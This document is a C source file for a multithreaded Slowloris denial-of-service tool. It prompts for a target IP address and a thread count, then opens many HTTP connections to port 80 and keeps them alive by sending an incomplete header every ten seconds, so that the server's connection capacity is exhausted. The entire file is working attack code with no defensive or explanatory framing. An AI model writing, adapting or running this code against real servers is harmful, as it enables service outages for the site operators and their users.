#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#define BUFFER_SIZE 4096

// Function to send partial HTTP headers
void *slowloris_attack(void *arg) {
    char *target_ip = (char *)arg;
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    
    while (1) {
        // Create socket
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            perror("Socket creation failed");
            continue;
        }

        // Set server address
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(80);  // HTTP port
        server_addr.sin_addr.s_addr = inet_addr(target_ip);

        // Connect to the target server
        if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection failed");
            close(sockfd);
            continue;
        }

        // Send partial HTTP request
        snprintf(buffer, BUFFER_SIZE, "GET / HTTP/1.1\r\nHost: %s\r\n", target_ip);
        send(sockfd, buffer, strlen(buffer), 0);

        // Keep the connection alive by sending one incomplete header periodically
        while (1) {
            snprintf(buffer, BUFFER_SIZE, "X-a: b\r\n");  // Send a small header to keep the connection alive
            send(sockfd, buffer, strlen(buffer), 0);
            sleep(10);  // Wait before sending another header
        }

        close(sockfd);
    }
}

int main() {
    char target_ip[100];
    int threads;

    // Get user input for target IP and number of threads
    printf("Enter the remote host's IP address: ");
    scanf("%s", target_ip);

    printf("Enter the number of threads to use: ");
    scanf("%d", &threads);

    pthread_t thread_pool[threads];

    // Create multiple threads for the attack
    for (int i = 0; i < threads; i++) {
        pthread_create(&thread_pool[i], NULL, slowloris_attack, target_ip);
    }

    // Join threads (wait for them to finish)
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    return 0;
}
